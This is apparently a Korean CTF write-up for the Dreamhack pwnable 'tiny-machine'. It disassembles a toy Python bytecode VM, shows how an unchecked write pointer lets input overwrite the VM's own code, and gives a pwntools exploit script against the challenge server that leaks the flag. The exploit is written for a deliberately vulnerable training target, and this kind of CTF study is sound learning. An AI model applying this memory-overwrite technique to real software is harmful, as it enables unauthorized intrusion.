---
title: "tiny-machine 라이트업"
date: 2025-05-06 00:00:00 +0900
categories: [CTF]
tags: [pwnable, writeup]
permalink: /posts/pwn-tiny-machine/
---

소스 코드가 파이썬 코드로 주어집니다.
```python
import sys

class TinyMachine():
    def __init__(self, memory):
        self.memory = memory
        self.ip = 0
        self.registers = [0, 0, 0, 0]
        self.halted = False

    def setIp(self, ip):
        self.ip = ip

    def run(self):
        if self.halted:
            return

        while True:
            try:
                opcode = self.memory[self.ip]

                if opcode in [0, 1, 2, 3, 4, 5]:
                    dest = self.memory[self.ip + 1]
                    src = self.memory[self.ip + 2]

                if opcode == 0: #LOAD
                    self.registers[dest] = self.memory[self.registers[src]]
                    self.ip += 3
                elif opcode == 1: #STORE
                    self.memory[self.registers[dest]] = self.registers[src]
                    self.ip += 3
                elif opcode == 2: #MOV_R_IMM
                    self.registers[dest] = src
                    self.ip += 3
                elif opcode == 3: #MOV_R_R
                    self.registers[dest] = self.registers[src]
                    self.ip += 3
                elif opcode == 4: #ADD_R_R
                    self.registers[dest] = (self.registers[dest] + self.registers[src]) & 0xFF
                    self.ip += 3
                elif opcode == 5: #ADD_R_IMM
                    self.registers[dest] = (self.registers[dest] + src) & 0xFF
                    self.ip += 3
                elif opcode == 6: #JNZ
                    if self.registers[1] != 0:
                        dest = self.memory[self.ip + 1]
                        self.ip = (self.ip + dest) & 0xFF
                    else:
                        self.ip += 2
                elif opcode == 7: #JMP
                    dest = self.memory[self.ip + 1]
                    self.ip = (self.ip + dest) & 0xFF
                elif opcode == 8: #EXT
                    if self.registers[0] == 0:
                        self.registers[1] = sys.stdin.buffer.read(1)[0]
                    elif self.registers[0] == 1:
                        sys.stdout.write(chr(self.registers[1]))
                        sys.stdout.flush()
                    self.ip += 1
                else:
                    self.halted = True
                    return
            except Exception as e:
                halted = True
                return

FLAG = b'DH{xxxxxxxxxxxxxxxxxxxxxxxxx}' #25

memory = list(FLAG + b'\xFF' * 192 + b'\x02\x02\x1d\x07\x02\x08\x01\x02\x01\x05\x02\x01\x05\x01\xf6\x06\xf4\x02\x00\x01\x02\x02\x1d\x00\x01\x02\x08\x05\x02\x01\x05\x01\xf6\x06\xf6')
machine = TinyMachine(memory)
machine.ip = 221
machine.run()
print("test")
```

**memory**는 다음 구조를 가진 리스트입니다.
```
FLAG(29) + Padding(192) + bytecode(35)
```

# 공격 기법
처음에는 **memory**가 무질서해 보입니다. 하지만 어셈블리 관점에서 분석할 수 있습니다. <br>

각 opcode에 대해 0, 1, 2개의 피연산자가 있습니다. <br>

1. LOAD, STORE, MOV_R_IMM, MOV_R_R, ADD_R_R, ADD_R_IMM => 2개의 피연산자(src, dest)
2. JNZ, JMP => 1개의 피연산자(dest)
3. EXT => 피연산자 없음(reg[1]을 기반으로 read/write 수행)

2-피연산자 연산 후 self.ip가 3씩 증가하고, 1-피연산자는 2씩 증가합니다. 따라서 바이트 코드를 아래와 같이 재구성할 수 있습니다.
```
IP: 221  \x02\x02\x1d   MOV   reg[2], 29     ; 레지스터 2에 29 저장 (FLAG 다음 주소)
IP: 224  \x07\x02       JMP   +2             ; IP를 2 증가 (IP를 226으로 설정)
IP: 226  \x08           EXT                  ; 입력 받기 (reg[0]=0 모드)
IP: 227  \x01\x02\x01   STORE [reg[2]], reg[1] ; 입력 값을 memory[reg[2]]에 저장
IP: 230  \x05\x02\x01   ADD   reg[2], 1      ; 레지스터 2를 1 증가 (다음 메모리 주소로 이동)
IP: 233  \x05\x01\xf6   ADD   reg[1], -10    ; 레지스터 1에 -10 추가 (카운터)
IP: 236  \x06\xf4       JNZ   -12            ; reg[1]≠0이면 IP = 224로 점프 (JMP 명령어)
IP: 238  \x02\x00\x01   MOV   reg[0], 1      ; 레지스터 0에 1 저장 (출력 모드로 전환)
IP: 241  \x02\x02\x1d   MOV   reg[2], 29     ; 레지스터 2에 29 저장 (같은 메모리 영역으로 복귀)
IP: 244  \x00\x01\x02   LOAD  reg[1], [reg[2]] ; memory[reg[2]]의 값을 reg[1]에 로드
IP: 247  \x08           EXT                  ; 출력 (reg[0]=1은 출력 모드 의미)
IP: 248  \x05\x02\x01   ADD   reg[2], 1      ; 레지스터 2를 1 증가 (다음 위치)
IP: 251  \x05\x01\xf6   ADD   reg[1], -10    ; 레지스터 1에 -10 추가 (카운터)
IP: 254  \x06\xf6       JNZ   -10            ; reg[1]≠0이면 IP = 244로 점프 (LOAD 명령어)
```

이제 이 바이트 코드에 두 개의 루프가 있음을 알 수 있습니다: read와 write <br>

의도된 작업(추정)은 패딩 부분의 바이트를 읽고 채운 다음 출력하는 것입니다. <br>

하지만 레지스터 2 값의 제한이 없으므로 코드 부분을 덮어쓸 수 있습니다. <br>

IP:241 부분을 변경하여 레지스터 2를 0으로 초기화할 수 있습니다 -> FLAG부터 출력할 수 있습니다. <br>

재작성된 바이트 코드는 다음과 같습니다.
```
IP: 221  \x02\x02\x1d   MOV   reg[2], 29     ; 레지스터 2에 29 저장 (FLAG 다음 주소)
IP: 224  \x07\x02       JMP   +2             ; IP를 2 증가 (IP를 226으로 설정)
IP: 226  \x08           EXT                  ; 입력 받기 (reg[0]=0 모드)
IP: 227  \x01\x02\x01   STORE [reg[2]], reg[1] ; 입력 값을 memory[reg[2]]에 저장
IP: 230  \x05\x02\x01   ADD   reg[2], 1      ; 레지스터 2를 1 증가 (다음 메모리 주소로 이동)
IP: 233  \x05\x01\xf6   ADD   reg[1], -10    ; 레지스터 1에 -10 추가 (카운터)
IP: 236  \x06\xf4       JNZ   -12            ; reg[1]≠0이면 IP = 224로 점프 (JMP 명령어)
IP: 238  \x02\x00\x01   MOV   reg[0], 1      ; 레지스터 0에 1 저장 (출력 모드로 전환)
IP: 241  \x02\x02\x00   MOV   reg[2], 0     ; 레지스터 2에 0 저장 (플래그부터 시작) # 변경된 부분
IP: 244  \x00\x01\x02   LOAD  reg[1], [reg[2]] ; memory[reg[2]]의 값을 reg[1]에 로드
IP: 247  \x08           EXT                  ; 출력 (reg[0]=1은 출력 모드 의미)
IP: 248  \x05\x02\x01   ADD   reg[2], 1      ; 레지스터 2를 1 증가 (다음 위치)
IP: 251  \x06\xf3       JNZ   -7             ; reg[1]≠0이면 IP = 244로 점프 (LOAD 명령어) # 변경된 부분
```

# 익스플로잇
익스플로잇 코드는 다음과 같이 작성할 수 있습니다. <br>

**\x00**을 전송하는 것은 IP:251 부분을 위한 것으로 두 번째 루프를 종료하기 위함입니다. **\n**을 전송하는 것은 첫 번째 루프를 종료하기 위함입니다.
```python
from pwn import *

# p = process(['python3', 'tiny_machine.py'])
p = remote('host8.dreamhack.games',21257)

p.send(b'\x00')

for i in range(191):
    p.send(b'B')

program_malformed = b'\x02\x02\x1d\x07\x02\x08\x01\x02\x01\x05\x02\x01\x05\x01\xf6\x06\xf4\x02\x00\x01\x02\x02\x00\x00\x01\x02\x08\x05\x02\x01\x06\xf9'

for byte in program_malformed:
    p.send(bytes([byte]))

p.send(b'\n')

p.interactive()
```
